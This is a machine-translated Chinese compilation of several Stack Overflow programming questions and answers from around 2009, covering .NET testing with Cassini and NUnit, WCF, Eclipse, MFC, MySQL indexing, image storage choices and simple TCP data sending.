如果您需要这种灵活性，Task 类可以具有允许您传递函数指针（到实际执行任务的函数）的属性 - 您也可以将其他方法（如 ExecuteTasks）添加到 User ......

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-18T15:01:30.480

你能有一个任务数组/列表，并使用 Task_CallID 作为索引吗？

例如

```
User.Tasks[Task_CallID] = data.Task_Flag; 
```

如果您必须将它们全部作为成员，还有其他选择：

1.  维护从 Task_Call_ID 到 PropertyInfo 引用的映射，并使用它来设置正确的属性
2.  使用反射根据数字位 (X) 查找属性并设置该属性

这两个都是基于反射的，有点讨厌。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-18T15:35:12.663

为什么不将用户任务结构化为列表：

**用户类**

```
public List<ClassStructure.Tasks> Tasks {
    get; set;
} 
```

**您的方法变为：**

```
public void AssignTasks(User user, List<ClassStructure.Tasks> TaskStatus)    
{
    user.Tasks.AddRange(TaskStatus)   
} 
```

也就是说你根本不需要这个方法。然后，您的访问器将在用户的*任务*上运行*查找*并检查任务标志。

 ** * *

## 回答 #6

> 赞同：0
> 
> 时间：2011-11-29T17:08:04.857

字典是一个很好的选择。但是，当一个开关/案例变得非常复杂时，使用策略模式（虽然不适用于您的场景）。

# .net - Cassini/WebServer.WebDev、NUnit 和 AppDomainUnloadedException

> ID：561402
> 
> 赞同：9
> 
> 时间：2009-02-18T14:58:42.627
> 
> 标签：.net, nunit, cassini

我正在使用 Cassini/WebServer.WebDev 来运行一些使用 NUnit 的 WebService 自动化测试。

我没有做任何花哨的事情，只是

```
public class WebService{
  Microsoft.VisualStudio.WebHost.Server _server;

  public void Start(){
    _server = new Microsoft.VisualStudio.WebHost.Server(_port, "/", _physicalPath);
  }

  public void Dispose()
  {
    if (_server != null)
    {
      _server.Stop();
      _server = null;
    }
  }
}
[TestFixture]
public void TestFixture{
  [Test]
  public void Test(){
    using(WebService webService = new WebService()){
      webService.Start();
      // actual test invoking the webservice
    }
  }
} 
```

，但是当我使用 nunit-console.exe 运行它时，我得到以下输出：

```
NUnit version 2.5.0.9015 (Beta-2)
Copyright (C) 2002-2008 Charlie Poole.\r\nCopyright (C) 2002-2004 James W. Newki
rk, Michael C. Two, Alexei A. Vorontsov.\r\nCopyright (C) 2000-2002 Philip Craig
.\r\nAll Rights Reserved.

Runtime Environment -
   OS Version: Microsoft Windows NT 6.0.6001 Service Pack 1
  CLR Version: 2.0.50727.1434 ( Net 2.0.50727.1434 )

ProcessModel: Default    DomainUsage: Default
Execution Runtime: net-2.0.50727.1434
.....
Tests run: 5, Errors: 0, Failures: 0, Inconclusive: 0 Time: 28,4538451 seconds
  Not run: 0, Invalid: 0, Ignored: 0, Skipped: 0

Unhandled exceptions:
1) TestCase1 : System.AppDomainUnloadedException: Attempted to access an unloaded AppDomain.
2) TestCase2 : System.AppDomainUnloadedException: Attempted to access an unloaded AppDomain.
3) TestCase3 : System.AppDomainUnloadedException: Attempted to access an unloaded AppDomain.
4) TestCase4 : System.AppDomainUnloadedException: Attempted to access an unloaded AppDomain. 
```

如果我在调试器下运行 nunit-console，我会在调试控制台中得到以下输出：

```
[...]
The thread 0x1974 has exited with code 0 (0x0).
############################################################################
##############                 S U C C E S S               #################
############################################################################
Executed tests       : 5
Ignored tests        : 0
Failed tests         : 0
Unhandled exceptions : 4
Total time           : 25,7092944 seconds
############################################################################
The thread 0x1bd4 has exited with code 0 (0x0).
The thread 0x10f8 has exited with code 0 (0x0).
The thread '<No Name>' (0x1a80) has exited with code 0 (0x0).
A first chance exception of type 'System.AppDomainUnloadedException' occurred in System.Web.dll
##### Unhandled Exception while running 
System.AppDomainUnloadedException: Attempted to access an unloaded AppDomain.
   at System.Web.Hosting.ApplicationManager.HostingEnvironmentShutdownComplete(String appId, IApplicationHost appHost)
   at System.Web.Hosting.HostingEnvironment.OnAppDomainUnload(Object unusedObject, EventArgs unusedEventArgs)
A first chance exception of type 'System.Threading.ThreadAbortException' occurred in mscorlib.dll
A first chance exception of type 'System.Threading.ThreadAbortException' occurred in mscorlib.dll
A first chance exception of type 'System.Threading.ThreadAbortException' occurred in System.Web.dll
The thread 0x111c has exited with code 0 (0x0).
The program '[0x1A64] nunit-console.exe: Managed' has exited with code -100 (0xffffff9c). 
```

有没有人有任何想法可能导致这种情况？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-07-20T21:26:36.153

我有同样的问题，但没有使用卡西尼。相反，我拥有自己的基于`System.Net.HttpListener`ASP.Net 支持的 Web 服务器托管，方法`System.Web.HttpRuntime`是在通过`System.Web.Hosting.ApplicationHost.CreateApplicationHost()`. 这本质上就是 Cassini 的工作方式，只不过 Cassini 工作在套接字层，并且实现了很多`System.Net.HttpListener`自己提供的功能。

无论如何，为了解决我的问题，我需要`System.Web.HttpRuntime.Close()`在让 NUnit 卸载我的应用程序域之前调用。我通过`Close()`在我的 [SetupFixture] 类的 [TearDown] 方法和该方法调用的主机代理类中公开一个新方法来做到这一点`System.Web.HttpRuntime.Close()`。

我通过 .Net Reflector 查看了 Cassini 的实现，虽然它使用`System.Web.HttpRuntime.ProcessRequest()`了 ，但它似乎没有在`System.Web.HttpRuntime.Close()`任何地方调用。

我不确定如何继续使用预构建的 Cassini 实现 ( `Microsoft.VisualStudio.WebHost.Server`)，因为您需要在`System.Web.HttpRuntime.Close()`Cassini 创建的应用程序域中进行调用以托管 ASP.Net。

作为参考，以下是我使用嵌入式 Web 托管的一些工作单元测试。

我的`WebServerHost`类是一个非常小的类，它允许将请求编组到由`System.Web.Hosting.ApplicationHost.CreateApplicationHost()`.

```
using System;
using System.IO;
using System.Web;
using System.Web.Hosting;

public class WebServerHost :
    MarshalByRefObject
{
    public void
    Close()
    {
        HttpRuntime.Close();
    }

    public void
    ProcessRequest(WebServerContext context)
    {
        HttpRuntime.ProcessRequest(new WebServerRequest(context));
    }
} 
```

该类`WebServerContext`只是`System.Net.HttpListenerContext`派生自 System.MarshalByRefObject 的实例的包装器，以允许来自新的 ASP.Net 托管域的调用回调到我的域中。

```
using System;
using System.Net;

public class WebServerContext :
    MarshalByRefObject
{
    public
    WebServerContext(HttpListenerContext context)
    {
        this.context = context;
    }

    //  public methods and properties that forward to HttpListenerContext omitted

    private HttpListenerContext
    context;
} 
```

该类`WebServerRequest`只是抽象`System.Web.HttpWorkerRequest`类的一个实现，它通过该类从 ASP.Net 托管域回调到我的域`WebServerContext`。

```
using System;
using System.IO;
using System.Web;

class WebServerRequest :
    HttpWorkerRequest
{
    public
    WebServerRequest(WebServerContext context)
    {
        this.context = context;
    }

    //  implementation of HttpWorkerRequest methods omitted; they all just call
    //  methods and properties on context

    private WebServerContext
    context;
} 
```

该类`WebServer`是用于启动和停止 Web 服务器的控制器。启动时，使用我的类创建 ASP.Net 托管域`WebServerHost`作为代理以允许交互。一个`System.Net.HttpListener`实例也被启动并启动一个单独的线程来接受连接。建立连接后，将在线程池中启动一个工作线程来处理请求，再次通过我的`WebServerHost`类。最后，当 web 服务器停止时，监听器停止，控制器等待接受连接的线程退出，然后关闭监听器。**最后，HTTP 运行时也通过调用该`WebServerHost.Close()`方法关闭。**

```
using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Web.Hosting;

class WebServer
{
    public static void
    Start()
    {
        lock ( typeof(WebServer) )
        {
            //  do not start more than once
            if ( listener != null )
                return;

            //  create web server host in new AppDomain
            host =
                (WebServerHost)ApplicationHost.CreateApplicationHost
                (
                    typeof(WebServerHost),
                    "/",
                    Path.GetTempPath()
                );

            //  start up the HTTP listener
            listener = new HttpListener();
            listener.Prefixes.Add("http://*:8182/");
            listener.Start();

            acceptConnectionsThread = new Thread(acceptConnections);
            acceptConnectionsThread.Start();
        }
    }

    public static void
    Stop()
    {
        lock ( typeof(WebServer) )
        {
            if ( listener == null )
                return;

            //  stop listening; will cause HttpListenerException in thread blocked on GetContext()  
            listener.Stop();

            //  wait connection acceptance thread to exit
            acceptConnectionsThread.Join();
            acceptConnectionsThread = null;

            //  close listener
            listener.Close(); 
            listener = null;

            //  close host
            host.Close();
            host = null;
        }
    }

    private static WebServerHost
    host = null;

    private static HttpListener
    listener = null;

    private static Thread
    acceptConnectionsThread;

    private static void
    acceptConnections(object state)
    {
        while ( listener.IsListening )
        {
            try
            {
                HttpListenerContext context = listener.GetContext();
                ThreadPool.QueueUserWorkItem(handleConnection, context);
            }
            catch ( HttpListenerException e )
            {
                //  this exception is ignored; it will be thrown when web server is stopped and at that time
                //  listening will be set to false which will end the loop and the thread
            }
        }
    }

    private static void
    handleConnection(object state)
    {
        host.ProcessRequest(new WebServerContext((HttpListenerContext)state));
    }
} 
```

最后，这个`Initialization`标有 NUnit [SetupFixture] 属性的类用于在单元测试开始时启动 Web 服务器，并在它们完成时将其关闭。

```
using System;
using NUnit.Framework;

[SetUpFixture]
public class Initialization
{
    [SetUp]
    public void
    Setup()
    {
        //  start the local web server
        WebServer.Start();
    }

    [TearDown]
    public void
    TearDown()
    {
        //  stop the local web server
        WebServer.Stop();
    }
} 
```

我知道这并不能完全回答这个问题，但我希望你能找到有用的信息。

# c# - 双工回调始终是匿名的

> ID：561416
> 
> 赞同：6
> 
> 时间：2009-02-18T15:02:27.233
> 
> 标签：c#, wcf, duplex, servicehost, wcf-callbacks

我写了一个 WCF 双工服务和客户端。在我尝试在客户端实现中调用 .Demand() 之前，一切正常。该服务似乎匿名调用回调方法。我想我错过了如何正确配置服务。

用于创建 ServiceHost 的代码；

```
ServiceHost duplex = new ServiceHost(new ServerWCallbackImpl());           
NetTcpBinding secureBinding = new NetTcpBinding(SecurityMode.Message);
secureBinding.Security.Message.ClientCredentialType = MessageCredentialType.Windows;
duplex.AddServiceEndpoint(typeof(IServerWithCallback),
    secureBinding,
    "net.tcp://localhost:9080/DataService");
Console.WriteLine(Thread.CurrentPrincipal.Identity.Name); //<-- this correctly shows the current principal
duplex.Open();
if (duplex.State == CommunicationState.Opened) 
    ((ServerWCallbackImpl)duplex.SingletonInstance).Send("Hello World!"); 
```

用于创建客户端的代码；

```
CallbackImpl callbackInstance = new CallbackImpl();
NetTcpBinding secureBinding = new NetTcpBinding(SecurityMode.Message);
secureBinding.Security.Message.ClientCredentialType = MessageCredentialType.Windows;
DuplexChannelFactory<IServerWithCallback> cf = new DuplexChannelFactory<IServerWithCallback>(
    callbackInstance,
    secureBinding,
    new EndpointAddress(requestingEndpointAddress));           
cf.Credentials.Windows.AllowedImpersonationLevel = TokenImpersonationLevel.Impersonation;
cf.Credentials.Windows.ClientCredential = (NetworkCredential)CredentialCache.DefaultCredentials;
IServerWithCallback srv = cf.CreateChannel(new InstanceContext(callbackInstance));
srv.InitiateConversation(); 
```

客户端实现：

```
public void MethodOnClient(string message)
{
    Console.WriteLine(Thread.CurrentPrincipal.Identity.Name);  // <-- anonymous
    PrincipalPermission p = new PrincipalPermission(@"DOMAIN\User", null);
    p.Demand();  // <-- fails
} 
```

如何配置以便 ServiceHost 使用 Windows 凭据正确调用回调？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-29T07:35:54.563

是否将 TokenImpersonationLevel 设置为委托而不是模拟？像这样：

```
cf.Credentials.Windows.AllowedImpersonationLevel = TokenImpersonationLevel.Impersonation; 
```

请参阅[此 MSDN 文章](http://msdn.microsoft.com/en-us/library/ms730088.aspx)。

# select - 如何在图片库中获取所选图片的 ids/names/guids

> ID：561421
> 
> 赞同：1
> 
> 时间：2009-02-18T15:04:34.687
> 
> 标签：select, moss, image

我创建了一个图片库并选择了一些图片（通过复选框）。我还在标准工具栏中的“操作”菜单项中添加了一个菜单项“下载到我的应用程序”。现在，单击“下载到我的应用程序”选项时，我想以编程方式将选定的图片下载到我的应用程序中。那么如何获取所选图片的 ids/names/guids，以便获取图片的 SPListItem 或 SPFile 对象。

我可以在 url 中获得类似 ListId/ItemId 的任何令牌吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-05-27T04:50:21.990

您是否为要选择的每张图片创建了一个复选框？如果是这样，你怎么知道哪个图片与每个复选框相关联？因为这肯定是了解下载所需身份的关键，不是吗？

# java - 如何在Eclipse中查找程序开始的行号

> ID：561432
> 
> 赞同：2
> 
> 时间：2009-02-18T15:07:51.497
> 
> 标签：java, eclipse

我的代码可以在 Windows 下的 Eclipse 中正确找到 IMethod 的行号：

```
IMethod method= ...;
String source= type.getCompilationUnit().getSource();
int lineNumber= 1;
for (int i= 0; i < method.getSourceRange().getOffset(); i++)
    if (source.charAt(i) == Character.LINE_SEPARATOR)
        lineNumber++; 
```

但是，这在 Mac 上不起作用，假设是因为行分隔符不同，即使它正在运行的源代码是相同的。

1.  有没有一种内置的方法来获取行号而不必遍历源的每个字符？（好像应该有，但是没找到）
2.  如果没有，是否有一种独立于平台的方法来计算字符串中的换行符？

谢谢，

肯特贝克

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-18T15:29:43.907

我不能回答（1），但我会给（2）一个机会。

奇怪的是，我认为您的代码只是巧合。[`Character.LINE_SEPARATOR`](http://java.sun.com/javase/6/docs/api/java/lang/Character.html#LINE_SEPARATOR)表示 Unicode 类别；它不应该是平台的换行符，但它*恰好*具有值[13](http://java.sun.com/javase/6/docs/api/constant-values.html#java.lang.Character.LINE_SEPARATOR)，（您可能知道）是[`'\r'`](http://www.asciitable.com/). 如果我没记错的话，自 OS X 以来的 Mac 已经使用`'\n'`换行符，所以这就是它不起作用的原因。

我过去获得行分隔符的方式是[`System.getProperty("line.separator")`](http://java.sun.com/javase/6/docs/api/java/lang/System.html#getProperty(java.lang.String)). 这会返回 a `String`，因此它可能不合适。由于它似乎可以`'\r'`在 Windows 上使用，我猜一个简单的检查`'\n'`也足够了。或者，正如 Wouter Lievens 建议的那样，您可以使用 a`BufferedReader`包裹 a 。[`StringReader`](http://java.sun.com/javase/6/docs/api/java/io/StringReader.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T18:31:21.257

我最终改用正则表达式，因为它更简单。这使得我需要在文件中采用的方法数量中的代码为 O(n^2)，但我希望这应该是一个很小的数字，所以现在可以接受。

```
private int getMethodLineNumber(final IType type, IMethod method) throws JavaModelException {
    String source= type.getCompilationUnit().getSource();
    String sourceUpToMethod= source.substring(0, method.getSourceRange().getOffset());
    Pattern lineEnd= Pattern.compile("$", Pattern.MULTILINE | Pattern.DOTALL);
    return lineEnd.split(sourceUpToMethod).length;
} 
```

谢谢大家的帮助。

问候，

肯特

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T15:28:02.133

`String`您可以用支持方法的`BufferedReader`实例包装`readLine()`。这种方法大概可以正确解析任何类型的分隔符。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-18T15:39:47.177

您可以使用由[ToolFactory](http://help.eclipse.org/help33/index.jsp?topic=/org.eclipse.jdt.doc.isv/reference/api/org/eclipse/jdt/core/compiler/IScanner.html)构建的[IScanner](http://help.eclipse.org/help33/index.jsp?topic=/org.eclipse.jdt.doc.isv/reference/api/org/eclipse/jdt/core/ToolFactory.html)，[如此类](http://www.koders.com/java/fid2E73EF79A811DF4A7E4D6CDC5FCBF25887438A15.aspx?s=Imethod+getSourceRange+getOffset#L16)中使用的那样（不计算行数，但仍然提供了这个想法）

希望 IScanner 的内部 eclipse 实现可以在任何平台上正常工作。

```
IBuffer buffer = imethod.getOpenable().getBuffer();
ISourceRange sourceRange = imethod.getSourceRange();
ISourceRange nameRange = imethod.getNameRange();
IScanner scanner = null; // delay initialization

if (sourceRange != null && nameRange != null) {
    if (scanner == null) {
        scanner= ToolFactory.createScanner(false, false, true, false);
        scanner.setSource(buffer.getCharacters());
    }
    scanner.resetTo(sourceRange.getOffset(), nameRange.getOffset());
} else {
    return 0 // no lines;
}
// use scanner to count lines 
```

# mfc - 动态创建/销毁 CComboBox

> ID：561441
> 
> 赞同：2
> 
> 时间：2009-02-18T15:13:57.877
> 
> 标签：mfc, combobox

我需要在运行时在 CBS_DROPDOWN 和 CBS_DROPDOWNLIST 样式之间切换。看起来这样做的唯一方法是重新创建控件。

所以我有以下代码：

```
CRect rect;
m_Combo.GetWindowRect(&rect);
m_Combo.DestroyWindow();
m_Combo.Create(CBS_DROPDOWN | WS_VSCROLL | WS_TABSTOP  | WS_VISIBLE, rect, this, IDC_MYCOMBO); 
```

但所发生的只是组合消失了。我错过了什么？

编辑：

使用`ModifyStyle`不是一个选项，因为此样式无法在运行时更改。必须重新创建控件。

编辑2：

好的，所以我在屏幕坐标而不是对话框坐标中。

```
CRect rect;
m_Combo.GetWindowRect(&rect);
ScreenToClient(&rect);  // SUPER IMPORTANT :)
m_Combo.DestroyWindow();
m_Combo.Create(CBS_DROPDOWN | WS_VSCROLL | WS_TABSTOP  | WS_VISIBLE, rect, this, IDC_MYCOMBO); 
```

但是现在，位置是对的，但字体与对话框字体不匹配。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-19T12:42:28.543

将控件的字体设置为对话框字体还不够吗？也就是说，在重新创建控件之后立即

`m_Combo.SetFont(GetFont());`

# html - 确保链接不在域根目录时的最佳方法/实践？

> ID：561443
> 
> 赞同：1
> 
> 时间：2009-02-18T15:15:20.400
> 
> 标签：html, ruby-on-rails, sinatra

我一直在想这个问题，但是什么是确保在 Web 应用程序（RoR、Sinatra、PHP 等）中创建链接时（使用方法生成或写入）的最佳方法手）无论您是否位于域的根目录，它们都会转到正确的位置：[http](http://www.example.com/) ://www.example.com/或[http://www.example.com/this/is/where/the/应用程序/是/](http://www.example.com/this/is/where/the/app/is/)

我的想法是让最终用户在您的应用程序配置中的某处指定一个文档根目录，并使用它，但是我正在尝试一种很好的方法来做到这一点，而无需最终用户进行任何配置。

编辑：最终用户是指在服务器上设置应用程序的人。

编辑：我可以使用开头的“/”来始终获取相对于域的链接，但问题是如果应用程序本身不在根目录下，而是像[http://www.example.com/this这样的地方/is/where/the/app/is/](http://www.example.com/this/is/where/the/app/is/)所以我想说`gen_link('/')`并让它返回`/this/is/where/the/app/is/`或`gen_link('/some/thing')`返回`/this/is/where/the/app/is/some/thing`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-18T19:34:34.100

尝试`base`在 html 布局的头部设置元素怎么样？
首先，获取 URL，例如。以 Ilya 建议的方式（如果 PHP 适合您）。之后，您可以`base`按如下方式使用标签：

```
<base href="<?= $full_site_url ?>" /> 
```

这将为所有链接设置默认 URL，并且浏览器会将其添加到页面上的每个相对链接。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T15:49:07.980

首先，您需要通过某种 url re-writer 功能路由所有 url。

所以你不再这样做：

```
<a href="some/path/">Foo</a> 
```

但取而代之的是：

```
<a href="<%= url_for('some/path') %>">Foo</a> 
```

所有的网络框架都有这样的功能。虽然他们通常在那里做各种各样的魔法（与 MVC 控制器路径和视图有关），但在函数的末尾（从概念上）他们都在你的 url 前面加上一个“根”（例如`"/this/is/where/the/app/is/"`），以便允许您在应用程序中创建独立于硬编码基本路径的 url。

RoR 使用一个名为[`"relative_url_root"`](http://www.hostingrails.com/37/ActionController-AbstractRequestrelative_url_root).

Symfony (php) 使用一个配置指令，也称为[`"relative_url_root"`](http://trac.symfony-project.org/wiki/InstallingSymfonyInASubDirectory#UpdatetheRelativeRoot).

CakePHP 使用一个名为[`"WEBROOT_DIR"`](http://www.chriscassell.net/log/2006/07/27/how_to_install_.html).

在这些框架在 Apache 上运行的情况下，该值通常是动态计算的（如果您没有明确设置它）。在其他网络服务器上，环境变量通常不可用或不正确，因此无法一致地确定该值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T15:23:55.340

您可以自己确定所需的一切，无需配置。

这是一个 PHP 示例（假设 index.php 是您的脚本名称）：

```
<?
  $folder_on_server = substr ($_SERVER['PHP_SELF'], 0, strpos ($_SERVER['PHP_SELF'], '/index.php'));
  $server_name = $_SERVER['SERVER_NAME'];
  if (80 != $_SERVER['SERVER_PORT']) {
    $server_name .= ':'. $_SERVER['SERVER_PORT'];
  }
  $full_site_url = 'http://'. $server_name . $folder_on_server;
?> 
```

现在，您可以随时创建这样的链接：

```
<a href="<?= $full_site_url ?>/some/thing/">Something</a> 
```

另见评论中的讨论。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-18T15:32:09.720

ilya 的回答很好，但我认为更简单的方法是在所有链接之前加上前导“/”。这将确保它们始终相对于域的根：

```
<a href="/some/thing">Something</a> <!-- Always links to www.domain.com/some/thing -->
<a href="some/thing">Something</a> <!-- Acutal destination depends current path --> 
```

# mysql - MYSQL：创建表中的索引关键字以及何时使用它

> ID：561446
> 
> 赞同：47
> 
> 时间：2009-02-18T15:16:09.777
> 
> 标签：mysql

`index`关键字是什么意思，它的作用是什么？我知道这是为了加快查询速度，但我不太确定如何做到这一点。

何时如何选择要索引的列？

关键字使用示例`index`如下所示`create table`：

```
CREATE TABLE `blog_comment`
(
    `id` INTEGER  NOT NULL AUTO_INCREMENT,
    `blog_post_id` INTEGER,
    `author` VARCHAR(255),
    `email` VARCHAR(255),
    `body` TEXT,
    `created_at` DATETIME,
    PRIMARY KEY (`id`),
    INDEX `blog_comment_FI_1` (`blog_post_id`),
    CONSTRAINT `blog_comment_FK_1`
        FOREIGN KEY (`blog_post_id`)
        REFERENCES `blog_post` (`id`)
)Type=MyISAM 
```

;

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2009-02-18T15:27:43.290

我建议阅读[MySQL 参考手册](http://dev.mysql.com/doc/refman/5.0/en/)中的MySQL[如何使用索引](http://dev.mysql.com/doc/refman/5.0/en/mysql-indexes.html)。它指出使用了索引...

*   快速找到匹配`WHERE`子句的行。
*   从考虑中消除行。
*   在执行连接时从其他表中检索行。
*   查找特定索引列的`MIN()`或值。`MAX()`
*   对表进行排序或分组（在某些条件下）。
*   仅使用索引而不参考数据行来优化查询。

数据库中的索引就像书中的索引一样工作。您可以更快地在一本书中找到您要查找的内容，因为索引是按字母顺序列出的。MySQL 不是按字母顺序排列，而是使用[B-trees](http://en.wikipedia.org/wiki/B-tree)来组织它的索引，这对于它的目的来说更快（但对人类来说会花费更长的时间）。

使用更多索引意味着使用更多空间（以及维护索引的开销），因此只有在满足上述使用条件的列上才真正值得使用索引。

在您的示例中，`id`and`blog_post_id`列都使用索引（`PRIMARY KEY`也是索引），以便应用程序可以更快地找到它们。在 的情况下`id`，这很可能允许用户快速修改或删除评论，而在 的情况下`blog_post_id`，应用程序可以快速找到给定帖子的所有评论。

您会注意到该列没有索引`email`。这意味着通过特定电子邮件地址搜索所有博客文章可能需要相当长的时间。如果您想要添加通过特定电子邮件地址搜索所有评论的内容，那么也可以为其添加索引。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-02-18T15:21:11.010

此关键字意味着您正在`blog_post_id`与表一起在列上创建索引。

像这样的查询：

```
SELECT *
FROM blog_comment
WHERE blog_post_id = @id 
```

将使用该索引在该字段上进行搜索并运行得更快。

此外，`foreign key`此列上有一个。

当您决定删除博客文章时，数据库将需要检查此表以查看没有孤立评论。索引也会加快这个检查，所以查询像

```
DELETE
FROM blog_post
WHERE ... 
```

也会跑得更快。

# asp.net - 将图片存储为文件或存储在诸如 MSSQL 之类的数据库中以用于 Web 应用程序？

> ID：561447
> 
> 赞同：133
> 
> 时间：2009-02-18T15:16:49.413
> 
> 标签：asp.net, database

我正在构建一个 ASP .NET Web 解决方案，其中将包含大量图片并希望有相当多的流量。我真的很想取得成绩。

我应该将图片保存在数据库中还是文件系统中？不管答案如何，我对为什么选择特定方式更感兴趣。

* * *

## 回答 #1

> 赞同：185
> 
> 时间：2009-02-18T15:23:49.227

将图片存储在文件系统和数据库中的图片位置。

为什么？因为...

1.  您将能够将图片作为静态文件提供。
2.  获取图片不需要数据库访问或应用程序代码。
3.  可以从不同的服务器提供图像以提高性能。
4.  它将减少数据库瓶颈。
5.  数据库最终将其数据存储在文件系统上。
6.  当存储在文件系统上时，图像可以很容易地被缓存。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2009-02-18T15:21:34.537

在我最近开发的项目中，我将图像（以及各种二进制文档）作为图像列存储在数据库表中。

将文件存储在数据库中的优势显然是，如果删除记录，您最终不会在硬盘上看到未引用的文件，因为数据库（=元数据）和硬盘（=文件存储）之间的同步不是内置的并且必须手动编程。

使用今天的技术，我建议您将图像存储在 SQL Server 2008 FILESTREAM 列中（至少我将在下一个项目中这样做），因为它们结合了在数据库中存储数据和在单独文件中拥有大型二进制文件的优势（在至少根据广告;))

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2009-02-18T15:24:04.297

格言一直是“文件系统中的文件，数据库中的文件元数据”

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2009-02-18T15:21:20.590

最好将文件存储为文件。不同的数据库以不同的方式处理 Blob 数据，因此如果您必须迁移后端，您可能会遇到麻烦。

在提供图像时，将 <img src= 指向服务器上已存在的文件可能比从数据库字段创建临时文件并将 < img 标记指向该文件更快。

我通过谷歌搜索您的问题并阅读[http://databases.aspfaq.com/database/should-i-store-images-in-the-database-or-the-filesystem.html上的评论找到了这个答案](http://databases.aspfaq.com/database/should-i-store-images-in-the-database-or-the-filesystem.html)

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2009-02-18T15:26:26.053

我通常喜欢在数据库中有二进制文件，因为：

*   数据完整性：没有未引用的文件，没有任何关联文件的 db 中没有路径
*   数据一致性：进行数据库转储，仅此而已。没有“哦，我忘了 targz 这个数据目录。”

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2009-02-23T10:25:10.637

将图像存储在数据库中会增加为单个图像提供服务的数据库开销，并且如果您增长到该级别，则很难将其卸载到备用存储（S3、Akami）。将它们存储在数据库中可以更轻松地将您的应用程序移动到不同的服务器，因为现在只需要移动数据库。

将图像存储在磁盘上可以轻松卸载到备用存储，使图像成为静态元素，因此您不必在 Web 应用程序中处理 HTTP 标头以使图像可缓存。不利的一面是，如果您将应用程序移动到不同的服务器，您也需要记住移动图像；很容易忘记的东西。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2009-02-18T15:22:31.960

对于基于 Web 的应用程序，您将通过使用文件系统来存储图像获得更好的性能。这样做将允许您在应用程序中轻松实现多个级别的图像缓存。在数据库中存储图像有一些优势，但大多数时候这些优势来自基于客户端的应用程序。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-02-18T15:45:07.240

只是为到目前为止已经很好的答案添加更多内容。如果您将图像保存在数据库中，您仍然可以从 Web 级别和数据库级别***获得***缓存的好处。

*我认为对于数据库，您可以通过如何存储与与其关联的文本数据相关的图像以及是否可以将图像访问到特定查询中来实现这一点，以便数据库可以缓存查询（尽管只是理论上随意在这方面对我进行核弹）。*

对于 web 端，我猜因为你的问题是用 asp.net 标记的，所以你会使用 http 处理程序来提供图像。然后，您可以使用该框架的所有好处，并且只需将图像的密钥传递给 http 处理程序，就可以使域逻辑保持清洁。

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2015-09-27T10:45:21.133

1.  `Eclipse`这是将图像存储在文件系统中并将其元数据保存在数据库中 的分步示例（一般方法，Spring 实现）- [http://www.devmanuals.com/tutorials/java/spring/spring3/mvc /Spring3MVCImageUpload.html](http://www.devmanuals.com/tutorials/java/spring/spring3/mvc/Spring3MVCImageUpload.html)
2.  这里也是一个例子——http: [//www.journaldev.com/2573/spring-mvc-file-upload-example-tutorial-single-and-multiple-files](http://www.journaldev.com/2573/spring-mvc-file-upload-example-tutorial-single-and-multiple-files)
3.  你也可以调查这个项目的代码库——https: [//github.com/jdmr/fileUpload](https://github.com/jdmr/fileUpload)。注意[这个](https://github.com/jdmr/fileUpload/blob/master/src/main/java/org/davidmendoza/fileUpload/web/ImageController.java)控制器。

# java - 从 Java 调用 WCF 服务的技术

> ID：561449
> 
> 赞同：2
> 
> 时间：2009-02-18T15:17:00.927
> 
> 标签：java, .net, wcf

除了使用 Web 服务或 POX（或自定义 HTTP）之外，还有其他一些技术可以用来调用从 WCF 通过 ___________ 向 Java 世界公开的服务吗？这些请求将在同一台机器上。也许是原始 TCP/IP？

我只是在询问一个项目，我们可能需要提供一些在 .NET 世界中调用同步代码并将结果返回给我们的 Java 世界的方法。

感谢您的建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T18:20:05.463

要与 Java 客户端通信，您必须使用一种可互操作的协议，该协议限制您使用 HTTP 或 HTTPS。TCP 只能在 Intranet 上运行 Windows 的客户端之间使用。即使在同一台机器上，出于同样的原因，您也无法使用命名管道。

Juval Lowy 撰写的“ [WCF 服务编程](http://oreilly.com/catalog/9780596521301/index.html)”的第 1 章介绍了可互操作的协议。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-18T15:59:53.507

您可以尝试以下项目[http://iiop-net.sourceforge.net/](http://iiop-net.sourceforge.net/)

# c++ - 如何通过以太网连接将数据写入 IP:Port 地址？

> ID：561451
> 
> 赞同：1
> 
> 时间：2009-02-18T15:17:18.320
> 
> 标签：c++, networking, windows-xp, streaming, ethernet

我需要编写一个快速而肮脏的应用程序，以通过以太网连接将一些数据写入远程机器。远程机器正在等待数据，我只想向它发送一些数据以测试连接和带宽等。

例如，我希望能够通过连接发送已知模式的数据（简单计数或重复模式），并能够将带宽增加 x2、x10、x100 等。

无需握手、CRC、特定数据格式、帧等，只需简单的旧数据。

请...没有第三方库，只有 C++（或 C，或 python）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-18T15:53:32.743

如果可以使用 netcat：

```
echo "BEEFCAKE" | nc remote.host port 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-18T15:20:23.820

我可以推荐[Beej 的网络编程指南](http://beej.us/guide/bgnet/)。帮助我理解了所有的网络大话。

